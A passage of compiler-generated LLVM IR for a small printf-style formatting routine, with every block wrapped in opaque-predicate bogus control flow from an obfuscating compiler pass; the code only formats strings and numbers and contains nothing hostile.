  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %78

; <label>:61:                                     ; preds = %54
  %62 = load i32, i32* @x.13
  %63 = load i32, i32* @y.14
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  %70 = load i32, i32* @x.13
  %71 = load i32, i32* @y.14
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %574

; <label>:78:                                     ; preds = %54
  %79 = load i32, i32* @x.13
  %80 = load i32, i32* @y.14
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %78
  %87 = load i8*, i8** %13, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 37
  %91 = load i32, i32* @x.13
  %92 = load i32, i32* @y.14
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %90, label %99, label %100

; <label>:99:                                     ; preds = %originalBBpart212
  br label %563

; <label>:100:                                    ; preds = %originalBBpart212
  %101 = load i8*, i8** %13, align 8
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 45
  br i1 %104, label %105, label %108

; <label>:105:                                    ; preds = %100
  %106 = load i8*, i8** %13, align 8
  %107 = getelementptr inbounds i8, i8* %106, i32 1
  store i8* %107, i8** %13, align 8
  store i32 1, i32* %16, align 4
  br label %108

; <label>:108:                                    ; preds = %105, %100
  %109 = load i32, i32* @x.13
  %110 = load i32, i32* @y.14
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %108
  %117 = load i32, i32* @x.13
  %118 = load i32, i32* @y.14
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %125

; <label>:125:                                    ; preds = %130, %originalBBpart216
  %126 = load i8*, i8** %13, align 8
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 48
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %125
  %131 = load i8*, i8** %13, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %13, align 8
  %133 = load i32, i32* %16, align 4
  %134 = or i32 %133, 2
  store i32 %134, i32* %16, align 4
  br label %125

; <label>:135:                                    ; preds = %125
  %136 = load i32, i32* @x.13
  %137 = load i32, i32* @y.14
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %135
  %144 = load i32, i32* @x.13
  %145 = load i32, i32* @y.14
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %152

; <label>:152:                                    ; preds = %originalBBpart228, %originalBBpart220
  %153 = load i8*, i8** %13, align 8
  %154 = load i8, i8* %153, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp sge i32 %155, 48
  br i1 %156, label %157, label %178

; <label>:157:                                    ; preds = %152
  %158 = load i32, i32* @x.13
  %159 = load i32, i32* @y.14
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %157
  %166 = load i8*, i8** %13, align 8
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i32
  %169 = icmp sle i32 %168, 57
  %170 = load i32, i32* @x.13
  %171 = load i32, i32* @y.14
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %178

; <label>:178:                                    ; preds = %originalBBpart224, %152
  %179 = phi i1 [ false, %152 ], [ %169, %originalBBpart224 ]
  br i1 %179, label %180, label %208

; <label>:180:                                    ; preds = %178
  %181 = load i32, i32* %15, align 4
  %182 = mul nsw i32 %181, 10
  store i32 %182, i32* %15, align 4
  %183 = load i8*, i8** %13, align 8
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  %186 = sub nsw i32 %185, 48
  %187 = load i32, i32* %15, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %15, align 4
  br label %189

; <label>:189:                                    ; preds = %180
  %190 = load i32, i32* @x.13
  %191 = load i32, i32* @y.14
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %189
  %198 = load i8*, i8** %13, align 8
  %199 = getelementptr inbounds i8, i8* %198, i32 1
  store i8* %199, i8** %13, align 8
  %200 = load i32, i32* @x.13
  %201 = load i32, i32* @y.14
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %152

; <label>:208:                                    ; preds = %178
  %209 = load i32, i32* @x.13
  %210 = load i32, i32* @y.14
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %208
  %217 = load i8*, i8** %13, align 8
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 115
  %221 = load i32, i32* @x.13
  %222 = load i32, i32* @y.14
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %220, label %229, label %263

; <label>:229:                                    ; preds = %originalBBpart232
  %230 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %231 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = icmp ule i32 %232, 40
  br i1 %233, label %234, label %240

; <label>:234:                                    ; preds = %229
  %235 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 3
  %236 = load i8*, i8** %235, align 8
  %237 = getelementptr i8, i8* %236, i32 %232
  %238 = bitcast i8* %237 to i32*
  %239 = add i32 %232, 8
  store i32 %239, i32* %231, align 8
  br label %245

; <label>:240:                                    ; preds = %229
  %241 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 2
  %242 = load i8*, i8** %241, align 8
  %243 = bitcast i8* %242 to i32*
  %244 = getelementptr i8, i8* %242, i32 8
  store i8* %244, i8** %241, align 8
  br label %245

; <label>:245:                                    ; preds = %240, %234
  %246 = phi i32* [ %238, %234 ], [ %243, %240 ]
  %247 = load i32, i32* %246, align 4
  %248 = sext i32 %247 to i64
  %249 = inttoptr i64 %248 to i8*
  store i8* %249, i8** %19, align 8
  %250 = load i8**, i8*** %12, align 8
  %251 = load i8*, i8** %19, align 8
  %252 = icmp ne i8* %251, null
  br i1 %252, label %253, label %255

; <label>:253:                                    ; preds = %245
  %254 = load i8*, i8** %19, align 8
  br label %256

; <label>:255:                                    ; preds = %245
  br label %256

; <label>:256:                                    ; preds = %255, %253
  %257 = phi i8* [ %254, %253 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.36, i32 0, i32 0), %255 ]
  %258 = load i32, i32* %15, align 4
  %259 = load i32, i32* %16, align 4
  %260 = call i32 @prints(i8** %250, i8* %257, i32 %258, i32 %259)
  %261 = load i32, i32* %17, align 4
  %262 = add nsw i32 %261, %260
  store i32 %262, i32* %17, align 4
  br label %571

; <label>:263:                                    ; preds = %originalBBpart232
  %264 = load i8*, i8** %13, align 8
  %265 = load i8, i8* %264, align 1
  %266 = zext i8 %265 to i32
  %267 = icmp eq i32 %266, 100
  br i1 %267, label %268, label %309

; <label>:268:                                    ; preds = %263
  %269 = load i8**, i8*** %12, align 8
  %270 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %271 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 8
  %273 = icmp ule i32 %272, 40
  br i1 %273, label %274, label %296

; <label>:274:                                    ; preds = %268
  %275 = load i32, i32* @x.13
  %276 = load i32, i32* @y.14
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %274
  %283 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 3
  %284 = load i8*, i8** %283, align 8
  %285 = getelementptr i8, i8* %284, i32 %272
  %286 = bitcast i8* %285 to i32*
  %287 = add i32 %272, 8
  store i32 %287, i32* %271, align 8
  %288 = load i32, i32* @x.13
  %289 = load i32, i32* @y.14
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart239, label %originalBB34alteredBB

originalBBpart239:                                ; preds = %originalBB34
  br label %301

; <label>:296:                                    ; preds = %268
  %297 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 2
  %298 = load i8*, i8** %297, align 8
  %299 = bitcast i8* %298 to i32*
  %300 = getelementptr i8, i8* %298, i32 8
  store i8* %300, i8** %297, align 8
  br label %301

; <label>:301:                                    ; preds = %296, %originalBBpart239
  %302 = phi i32* [ %286, %originalBBpart239 ], [ %299, %296 ]
  %303 = load i32, i32* %302, align 4
  %304 = load i32, i32* %15, align 4
  %305 = load i32, i32* %16, align 4
  %306 = call i32 @printi(i8** %269, i32 %303, i32 10, i32 1, i32 %304, i32 %305, i32 97)
  %307 = load i32, i32* %17, align 4
  %308 = add nsw i32 %307, %306
  store i32 %308, i32* %17, align 4
  br label %571

; <label>:309:                                    ; preds = %263
  %310 = load i32, i32* @x.13
  %311 = load i32, i32* @y.14
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %309
  %318 = load i8*, i8** %13, align 8
  %319 = load i8, i8* %318, align 1
  %320 = zext i8 %319 to i32
  %321 = icmp eq i32 %320, 120
  %322 = load i32, i32* @x.13
  %323 = load i32, i32* @y.14
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %321, label %330, label %387

; <label>:330:                                    ; preds = %originalBBpart243
  %331 = load i8**, i8*** %12, align 8
  %332 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %333 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %332, i32 0, i32 0
  %334 = load i32, i32* %333, align 8
  %335 = icmp ule i32 %334, 40
  br i1 %335, label %336, label %358

; <label>:336:                                    ; preds = %330
  %337 = load i32, i32* @x.13
  %338 = load i32, i32* @y.14
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %336
  %345 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %332, i32 0, i32 3
  %346 = load i8*, i8** %345, align 8
  %347 = getelementptr i8, i8* %346, i32 %334
  %348 = bitcast i8* %347 to i32*
  %349 = add i32 %334, 8
  store i32 %349, i32* %333, align 8
  %350 = load i32, i32* @x.13
  %351 = load i32, i32* @y.14
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBBpart257, label %originalBB45alteredBB

originalBBpart257:                                ; preds = %originalBB45
  br label %379

; <label>:358:                                    ; preds = %330
  %359 = load i32, i32* @x.13
  %360 = load i32, i32* @y.14
  %361 = sub i32 %359, 1
  %362 = mul i32 %359, %361
  %363 = urem i32 %362, 2
  %364 = icmp eq i32 %363, 0
  %365 = icmp slt i32 %360, 10
  %366 = or i1 %364, %365
  br i1 %366, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %358
  %367 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %332, i32 0, i32 2
  %368 = load i8*, i8** %367, align 8
  %369 = bitcast i8* %368 to i32*
  %370 = getelementptr i8, i8* %368, i32 8
  store i8* %370, i8** %367, align 8
  %371 = load i32, i32* @x.13
  %372 = load i32, i32* @y.14
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %379

; <label>:379:                                    ; preds = %originalBBpart261, %originalBBpart257
  %380 = phi i32* [ %348, %originalBBpart257 ], [ %369, %originalBBpart261 ]
  %381 = load i32, i32* %380, align 4
  %382 = load i32, i32* %15, align 4
  %383 = load i32, i32* %16, align 4
  %384 = call i32 @printi(i8** %331, i32 %381, i32 16, i32 0, i32 %382, i32 %383, i32 97)
  %385 = load i32, i32* %17, align 4
  %386 = add nsw i32 %385, %384
  store i32 %386, i32* %17, align 4
  br label %571

; <label>:387:                                    ; preds = %originalBBpart243
  %388 = load i8*, i8** %13, align 8
  %389 = load i8, i8* %388, align 1
  %390 = zext i8 %389 to i32
  %391 = icmp eq i32 %390, 88
  br i1 %391, label %392, label %433

; <label>:392:                                    ; preds = %387
  %393 = load i8**, i8*** %12, align 8
  %394 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %395 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %394, i32 0, i32 0
  %396 = load i32, i32* %395, align 8
  %397 = icmp ule i32 %396, 40
  br i1 %397, label %398, label %404

; <label>:398:                                    ; preds = %392
  %399 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %394, i32 0, i32 3
  %400 = load i8*, i8** %399, align 8
  %401 = getelementptr i8, i8* %400, i32 %396
  %402 = bitcast i8* %401 to i32*
  %403 = add i32 %396, 8
  store i32 %403, i32* %395, align 8
  br label %409

; <label>:404:                                    ; preds = %392
  %405 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %394, i32 0, i32 2
  %406 = load i8*, i8** %405, align 8
  %407 = bitcast i8* %406 to i32*
  %408 = getelementptr i8, i8* %406, i32 8
  store i8* %408, i8** %405, align 8
  br label %409

; <label>:409:                                    ; preds = %404, %398
  %410 = phi i32* [ %402, %398 ], [ %407, %404 ]
  %411 = load i32, i32* @x.13
  %412 = load i32, i32* @y.14
  %413 = sub i32 %411, 1
  %414 = mul i32 %411, %413
  %415 = urem i32 %414, 2
  %416 = icmp eq i32 %415, 0
  %417 = icmp slt i32 %412, 10
  %418 = or i1 %416, %417
  br i1 %418, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %409
  %419 = load i32, i32* %410, align 4
  %420 = load i32, i32* %15, align 4
  %421 = load i32, i32* %16, align 4
  %422 = call i32 @printi(i8** %393, i32 %419, i32 16, i32 0, i32 %420, i32 %421, i32 65)
  %423 = load i32, i32* %17, align 4
  %424 = add nsw i32 %423, %422
  store i32 %424, i32* %17, align 4
  %425 = load i32, i32* @x.13
  %426 = load i32, i32* @y.14
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart268, label %originalBB63alteredBB

originalBBpart268:                                ; preds = %originalBB63
  br label %571

; <label>:433:                                    ; preds = %387
  %434 = load i32, i32* @x.13
  %435 = load i32, i32* @y.14
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %433
  %442 = load i8*, i8** %13, align 8
  %443 = load i8, i8* %442, align 1
  %444 = zext i8 %443 to i32
  %445 = icmp eq i32 %444, 117
  %446 = load i32, i32* @x.13
  %447 = load i32, i32* @y.14
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %445, label %454, label %479

; <label>:454:                                    ; preds = %originalBBpart272
  %455 = load i8**, i8*** %12, align 8
  %456 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %457 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 0
  %458 = load i32, i32* %457, align 8
  %459 = icmp ule i32 %458, 40
  br i1 %459, label %460, label %466

; <label>:460:                                    ; preds = %454
  %461 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 3
  %462 = load i8*, i8** %461, align 8
  %463 = getelementptr i8, i8* %462, i32 %458
  %464 = bitcast i8* %463 to i32*
  %465 = add i32 %458, 8
  store i32 %465, i32* %457, align 8
  br label %471

; <label>:466:                                    ; preds = %454
  %467 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 2
  %468 = load i8*, i8** %467, align 8
  %469 = bitcast i8* %468 to i32*
  %470 = getelementptr i8, i8* %468, i32 8
  store i8* %470, i8** %467, align 8
  br label %471

; <label>:471:                                    ; preds = %466, %460
  %472 = phi i32* [ %464, %460 ], [ %469, %466 ]
  %473 = load i32, i32* %472, align 4
  %474 = load i32, i32* %15, align 4
  %475 = load i32, i32* %16, align 4
  %476 = call i32 @printi(i8** %455, i32 %473, i32 10, i32 0, i32 %474, i32 %475, i32 97)
  %477 = load i32, i32* %17, align 4
  %478 = add nsw i32 %477, %476
  store i32 %478, i32* %17, align 4
  br label %571

; <label>:479:                                    ; preds = %originalBBpart272
  %480 = load i32, i32* @x.13
  %481 = load i32, i32* @y.14
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %479
  %488 = load i8*, i8** %13, align 8
  %489 = load i8, i8* %488, align 1
  %490 = zext i8 %489 to i32
  %491 = icmp eq i32 %490, 99
  %492 = load i32, i32* @x.13
  %493 = load i32, i32* @y.14
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %491, label %500, label %545

; <label>:500:                                    ; preds = %originalBBpart276
  %501 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %502 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %501, i32 0, i32 0
  %503 = load i32, i32* %502, align 8
  %504 = icmp ule i32 %503, 40
  br i1 %504, label %505, label %511

; <label>:505:                                    ; preds = %500
  %506 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %501, i32 0, i32 3
  %507 = load i8*, i8** %506, align 8
  %508 = getelementptr i8, i8* %507, i32 %503
  %509 = bitcast i8* %508 to i32*
  %510 = add i32 %503, 8
  store i32 %510, i32* %502, align 8
  br label %532

; <label>:511:                                    ; preds = %500
  %512 = load i32, i32* @x.13
  %513 = load i32, i32* @y.14
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %511
  %520 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %501, i32 0, i32 2
  %521 = load i8*, i8** %520, align 8
  %522 = bitcast i8* %521 to i32*
  %523 = getelementptr i8, i8* %521, i32 8
  store i8* %523, i8** %520, align 8
  %524 = load i32, i32* @x.13
  %525 = load i32, i32* @y.14
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %532

; <label>:532:                                    ; preds = %originalBBpart280, %505
  %533 = phi i32* [ %509, %505 ], [ %522, %originalBBpart280 ]
  %534 = load i32, i32* %533, align 4
  %535 = trunc i32 %534 to i8
  %536 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 0
  store i8 %535, i8* %536, align 1
  %537 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 1
  store i8 0, i8* %537, align 1
  %538 = load i8**, i8*** %12, align 8
  %539 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i32 0, i32 0
  %540 = load i32, i32* %15, align 4
  %541 = load i32, i32* %16, align 4
  %542 = call i32 @prints(i8** %538, i8* %539, i32 %540, i32 %541)
  %543 = load i32, i32* %17, align 4
  %544 = add nsw i32 %543, %542
  store i32 %544, i32* %17, align 4
  br label %571

; <label>:545:                                    ; preds = %originalBBpart276
  br label %570

; <label>:546:                                    ; preds = %originalBBpart24
  %547 = load i32, i32* @x.13
  %548 = load i32, i32* @y.14
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %546
  %555 = load i32, i32* @x.13
  %556 = load i32, i32* @y.14
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %563

; <label>:563:                                    ; preds = %originalBBpart284, %99
  %564 = load i8**, i8*** %12, align 8
  %565 = load i8*, i8** %13, align 8
  %566 = load i8, i8* %565, align 1
  %567 = zext i8 %566 to i32
  call void @printchar(i8** %564, i32 %567)
  %568 = load i32, i32* %17, align 4
  %569 = add nsw i32 %568, 1
  store i32 %569, i32* %17, align 4
  br label %570

; <label>:570:                                    ; preds = %563, %545
  br label %571

; <label>:571:                                    ; preds = %570, %532, %471, %originalBBpart268, %379, %301, %256
  %572 = load i8*, i8** %13, align 8
  %573 = getelementptr inbounds i8, i8* %572, i32 1
  store i8* %573, i8** %13, align 8
  br label %28

; <label>:574:                                    ; preds = %originalBBpart28, %28
  %575 = load i32, i32* @x.13
  %576 = load i32, i32* @y.14
  %577 = sub i32 %575, 1
  %578 = mul i32 %575, %577
  %579 = urem i32 %578, 2
  %580 = icmp eq i32 %579, 0
  %581 = icmp slt i32 %576, 10
  %582 = or i1 %580, %581
  br i1 %582, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %574
  %583 = load i8**, i8*** %12, align 8
  %584 = icmp ne i8** %583, null
  %585 = load i32, i32* @x.13
  %586 = load i32, i32* @y.14
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %584, label %593, label %596

; <label>:593:                                    ; preds = %originalBBpart288
  %594 = load i8**, i8*** %12, align 8
  %595 = load i8*, i8** %594, align 8
  store i8 0, i8* %595, align 1
  br label %596

; <label>:596:                                    ; preds = %593, %originalBBpart288
  %597 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %598 = bitcast %struct.__va_list_tag* %597 to i8*
  call void @llvm.va_end(i8* %598)
  %599 = load i32, i32* %17, align 4
  ret i32 %599

originalBBalteredBB:                              ; preds = %originalBB, %3
  %600 = alloca i8**, align 8
  %601 = alloca i8*, align 8
  %602 = alloca %struct.__va_list_tag*, align 8
  %603 = alloca i32, align 4
  %604 = alloca i32, align 4
  %605 = alloca i32, align 4
  %606 = alloca [2 x i8], align 1
  %607 = alloca i8*, align 8
  store i8** %0, i8*** %600, align 8
  store i8* %1, i8** %601, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %602, align 8
  store i32 0, i32* %605, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %608 = load i8*, i8** %13, align 8
  %609 = load i8, i8* %608, align 1
  %610 = zext i8 %609 to i32
  %611 = icmp eq i32 %610, 37
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %78
  %612 = load i8*, i8** %13, align 8
  %613 = load i8, i8* %612, align 1
  %614 = zext i8 %613 to i32
  %615 = icmp eq i32 %614, 37
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %108
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %135
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %157
  %616 = load i8*, i8** %13, align 8
  %617 = load i8, i8* %616, align 1
  %618 = zext i8 %617 to i32
  %619 = icmp sle i32 %618, 57
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %189
  %620 = load i8*, i8** %13, align 8
  %621 = getelementptr inbounds i8, i8* %620, i32 1
  store i8* %621, i8** %13, align 8
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %208
  %622 = load i8*, i8** %13, align 8
  %623 = load i8, i8* %622, align 1
  %624 = zext i8 %623 to i32
